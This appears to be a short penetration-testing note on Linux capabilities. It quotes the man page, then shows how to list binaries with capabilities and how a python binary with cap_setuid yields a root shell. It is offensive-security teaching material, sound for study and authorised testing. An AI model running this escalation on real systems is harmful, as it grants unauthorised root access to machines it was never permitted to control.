# Capabilities

> For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes (whose effective user ID is 0, referred to as superuser or root), and  unprivileged  processes (whose effective UID is nonzero).  Privileged processes bypass all kernel permission checks, while processes are subject to full permission checking based on the process's credentials (usually: UID, effective GID, and supplementary group list).
> Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled. Capabilities are a per-thread attribute.

*- "Capabilities" man page*

Capabilities and SUID both have a similar function while Capabilities was introduced as a safer alternative to SUID. However unintended/misuse of capabilities lead to security vulnerabilities similar to SUID.

``` bash
getcap -r / 2> /dev/null
```

Example scenario (with `cap_setuid+ep`);
``` bash
user@host:~$ getcap -r / 2> /dev/null 
/usr/bin/python2.6 = cap_setuid+ep
user@host:~$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@host:~\# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
